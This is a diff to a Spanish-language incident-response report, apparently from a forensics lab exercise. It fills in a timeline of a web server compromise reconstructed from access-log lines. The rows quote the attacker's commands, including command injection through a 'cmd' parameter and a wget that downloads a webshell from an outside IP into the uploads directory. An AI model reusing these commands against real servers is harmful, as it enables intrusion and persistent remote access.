@@ -32,7 +32,9 @@ Como control, se calculó el hash de `logs/access.log` contra el contenido tal c
 
 | Hora (UTC) | Evento | Evidencia (archivo:línea) |
 |---|---|---|
-| | | |
+| 05/Sep/2026 02:18:10 | `185.220.101.42` consulta `GET /api/reporte?...&cmd=id`: primera prueba de ejecución de comandos contra el endpoint. Confirmado por la respuesta `200`. | `logs/access.log:18` |
+| 05/Sep/2026 02:18:33 | Misma IP envía `cmd=echo%20FLAG%7Bdfir_vector_sqli%7D%20%3E%20/tmp/.p` (URL-encoded). Decodificado: `echo FLAG{dfir_vector_sqli} > /tmp/.p`. Confirma que el parámetro `cmd` se ejecuta como comando del sistema — este es el vector de entrada/RCE (R1). | `logs/access.log:19` |
+| 05/Sep/2026 02:19:02 | La misma IP usa el mismo canal para `wget http://45.13.37.7/s.php -O /var/www/uploads/shell.php`: consistente con la descarga del webshell documentado en R2, pero su contenido en disco no fue verificado por P1. | `logs/access.log:20` |
 
 ## 4. Indicadores de compromiso (IOCs)
 
